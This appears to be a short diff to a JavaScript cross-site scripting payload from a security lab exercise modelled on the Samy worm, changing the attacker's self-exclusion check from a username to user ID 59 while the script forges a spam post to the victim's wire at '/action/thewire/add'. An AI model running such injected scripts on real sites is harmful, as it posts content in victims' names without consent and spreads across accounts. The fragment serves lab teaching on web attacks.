@@ -8,7 +8,7 @@
         var sendurl = "/action/thewire/add";
 
         // If the user is Samy, then the attack is not performed
-        if (name == "Samy") return;
+        if (guid == 59) return; // User ID of Samy
 
         var postBody = "To earn 12 USD/Hour(!), visit now\nhttp://www.seed-server.com/profile/samy";
 
